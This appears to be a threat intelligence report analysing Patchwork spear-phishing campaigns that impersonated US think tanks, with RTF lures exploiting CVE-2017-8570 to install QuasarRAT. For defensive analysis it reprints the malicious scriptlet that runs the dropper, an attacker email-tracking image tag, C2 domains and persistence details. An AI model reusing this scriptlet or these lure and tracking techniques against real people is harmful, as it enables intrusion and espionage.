This increase in threat activity was consistent with other observations documented over the last few months in blogs by 360 Threat Intelligence Center analyzing attacks on Chinese organizations and Trend Micro noting targets in South Asia. From the attacks observed by Volexity, what is most notable is that Patchwork has pivoted its targeting and has launched attacks directly against US-based think tanks. Volexity has also found that, in addition to sending malware lures, the Patchwork threat actors are leveraging unique tracking links in their e-mails for the purpose of identifying which recipients opened their e-mail messages.\\nIn three observed spear phishing campaigns, the threat actors leveraged domains and themes mimicking those of well-known think tank organizations in the United States. The group lifted articles and themes from the Council on Foreign Relations (CFR), the Center for Strategic and International Studies (CSIS), and the Mercator Institute for China Studies (MERICS) for use in their spear phishing lures and malicious Rich Text Format (RTF) documents. Strangely, in one case, the threat actors also appear to have used a domain name similar to the Foreign Policy Research Institute (FPRI) in a message purporting to be from CFR. Each of the spear phishing attacks contained links to .doc files, which were really RTF documents that attempt to exploit CVE-2017-8570 (Composite Moniker). The threat actors appear to have leveraged publicly available exploit code that can be found on Github at the URL: https://github.com/rxwx/CVE-2017-8570. If the exploit is successful, the threat actors will attempt to drop and execute QuasarRAT. Details of the malware and the associated attacks are listed below.\\nSpear Phishing Messages\\nEach e-mail was sent from the attacker-controlled domain mailcenter.support. This domain was not only used to send the phishing e-mails, but also to track which targets opened the e-mail. Within each of the HTML-formatted messages, an embedded image tag is used to beacon home to the attacker’s domain, containing an unique identifier specific to the recipient.\\n<img src=3D”hxxps://www.mailcenter.support/track/<unique_32_byte_identifier>” width=3D”0″ height=3D”0″ />\\nWhile the use of e-mail recipient tracking, a linked RTF document, and a final payload (QuasarRAT variant) remained the same, certain elements differed across campaigns observed. Details on each of the messages are listed below.\\nMessage 1:\\nHeaders\\nReceived: by mailcenter.support\\nSender\\nChina Policy Analysis <publications@chinapolicyanalysis.org>\\nSubject\\nChinas Arctic Dream\\nBody\\nContent and images included within the e-mail body were a direct copy of the following CSIS article:\\nhttps://www.csis.org/analysis/chinas-arctic-dream\\nNotes\\nThe hyperlinked text Download File of “China’s Arctic Dream” within the e-mail body lead to a malicious RTF document located at the URL\\nhxxp://chinapolicyanalysis.org/Chinas_Arctic_Dream.doc.\\nThe chinapolicyanalysis.org domain was used as the sender address, as well as the hosting location of the malicious RTF document.\\nMessage 2:\\nHeaders\\nReceived: by mailcenter.support\\nSender\\nCouncil on Foreign Relations <webprint@fprii.net>\\nSubject\\nThe Four Traps China May Fall Into\\nBody\\nContent and images included within the e-mail body were a direct copy of the following CFR article:\\nhttps://www.cfr.org/blog/four-traps-china-may-fall\\nNotes\\nMultiple hyperlinks within the e-mail body lead to a malicious RTF document located at the URL\\nhxxp://fprii.net/The_Four_Traps_for_China.doc.\\nThe fprii.net domain was used as the sender address, as well as the hosting location of the malicious RTF document.

The structure of the domain mimics the Mercator Institute for China Studies (MERICS), whose actual domain is merics.org.\\nSample Message\\nThe image below shows an example of how the spear phishing message would look to a recipient.\\nExploitation and Malware Execution\\nUpon opening the above attachments, the recipient will be presented with a document that is a direct copy of a blog post or report released by the think tank organization being impersonated. At first glance, everything might look legitimate, but in the background the target user has likely just been infected with QuasarRAT. QuasarRAT is a freely available “remote (administration|access) tool” (RAT) written in C# and distributed via Github. This RAT provides a variety of functionality that makes it particularly attractive to an attacker. This includes, but is not limited to, the following:\\nAES encryption of network communication\\nFile management\\nFunctionality to download, upload, and execute files\\nKeylogging\\nRemote desktop access\\nRemote webcam viewing\\nReverse proxy\\nBrowser and FTP client password recovery\\nThe images below are what a target user opening a malicious RTF document would see from within Microsoft Word.\\nWhen the malicious RTF document is opened, two things happen that allow the attacker malware to run. First, the “packager trick” is leveraged in order to embed the initial QuasarRAT dropper (qrat.exe) in the malicious RTF document. Its called the “packager trick” because any file embedded in an RTF file using packager will be automatically dropped to the %tmp% folder (c:\\\\Users\\\\%username%\\\\AppData\\\\Local\\\\Temp) when the RTF document is opened. Second, the threat actors exploit CVE-2017-8570 to achieve code execution via a malicious “scriptlet” file, or .sct file, which is also embedded in the malicious RTF document. The contents of the malicious scriptlet file (displayed below) clearly show the threat actor executing the initial “qrat.exe” dropper from the current user’s %tmp% directory.\\nNote: The scriptlet code is an exact match to that shown on the Github page referenced earlier for CVE-2017-8570. The string “fjzmpcjvqp” is unique and not something likely to be present if the code was not generated with the same public POC exploit code.\\n<?XML version=”1.0″?>\\n<scriptlet>\\n<registration description=”fjzmpcjvqp”\\nprogid=”fjzmpcjvqp”\\nversion=”1.00″\\nclassid=”{204774CF-D251-4F02-855B-2BE70585184B}”\\nremotable=”true” >\\n</registration>\\n<script language=”JScript”>\\n<![CDATA[\\nvar r = new ActiveXObject(“WScript.Shell”).Run(“cmd /c %tmp%\\\\\\\\qrat.exe”,0,false);\\nexit();\\n]]>\\n</script>\\n</scriptlet>\\nAfter the initial dropper (qrat.exe) has been executed by the embedded scriptlet, it creates a directory in C:\\\\Users\\\\%username%\\\\AppData\\\\Roaming\\\\Microsoft Network\\\\microsoft_network\\\\1.0.0.0 and unpacks/drops the final QuasarRAT binary named microsoft_network.exe.\\nThe malware also contains an embedded .NET wrapper DLL for creating and managing scheduled tasks on Windows systems. The file, named Microsoft.Win32.TaskScheduler.dll, is digitally signed by a certificate from AirVPN.\\nThis DLL is used to create a scheduled task that points to the QuasarRAT binary, microsoft_network.exe, allowing it to remain persistent after reboot.\\nAs seen in the image above, the QuasarRAT scheduled task is named Microsoft_Security_Task and runs at 12:00 AM each day. Once the task is triggered, it will then repeat every 5 minutes for 60 days. When executed, microsoft_network.exe will initiate a request to freegeoip.net in order to determine the geographical location of the infected host. Immediately following the request, the malware will begin to beacon over an encrypted connection to the threat actor’s command and control domain tautiaos.com (43.249.37.199). Several related samples were identified and are included in the File Indicators section below.\\nConclusion\\nThe addition of US-based think tanks to the list of organizations in the crosshairs of Patchwork shows an increasing diversity in the geographic regions being targeted. While there were a few peculiar components to some of the spear phish messages, the campaigns and themes were strategically relevant to the organizations being targeted. The Patchwork threat actors also appear to have adopted a technique seen from other APT groups where they are now tracking the effectiveness of their campaigns by recording which recipients have opened the phishing message. This information allows a threat actor to determine if their messages were delivered, which users are more susceptible to opening them, and basic information regarding the target’s operating system and e-mail client (or browser). Finally, although the payload observed being delivered by Patchwork in these campaigns is a readily available open source RAT, it does allow for flexibility in interacting with compromised machines without needing to use custom malware.
